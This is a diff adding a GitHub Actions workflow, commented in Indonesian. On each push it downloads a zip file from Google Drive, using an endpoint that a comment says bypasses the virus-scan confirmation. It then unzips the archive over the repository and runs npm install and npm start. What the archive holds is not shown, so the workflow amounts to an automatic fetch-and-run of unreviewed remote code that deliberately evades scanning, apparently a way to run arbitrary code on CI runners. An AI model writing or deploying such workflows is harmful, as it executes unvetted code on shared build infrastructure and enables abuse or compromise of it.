@@ -1,0 +1,37 @@
+name: Auto Install and Run
+on:
+  push:
+    branches: [ main ]
+  workflow_dispatch:
+
+jobs:
+  build-and-run:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout Repository
+        uses: actions/checkout@v4
+
+      - name: Setup Node.js 25
+        uses: actions/setup-node@v4
+        with:
+          node-version: '25' # Menggunakan Node.js versi 25 terbaru
+
+      - name: Download from Google Drive
+        run: |
+          # Menggunakan endpoint drive.usercontent untuk bypass konfirmasi virus scan (jika file >25MB)
+          curl -L "https://drive.usercontent.google.com/u/0/uc?id=1NTE5CjgtIH4kGMdk7a8s9Hcoca-RecLg&export=download" -o tester.zip
+
+      - name: Unzip File
+        run: |
+          # Mengekstrak file zip dan mengganti file yang ada jika duplikat
+          unzip -o tester.zip
+
+      - name: Install Dependencies
+        run: |
+          # Pastikan file package.json ada setelah unzip sebelum menjalankan ini
+          npm install
+
+      - name: Start Application
+        run: |
+          npm start
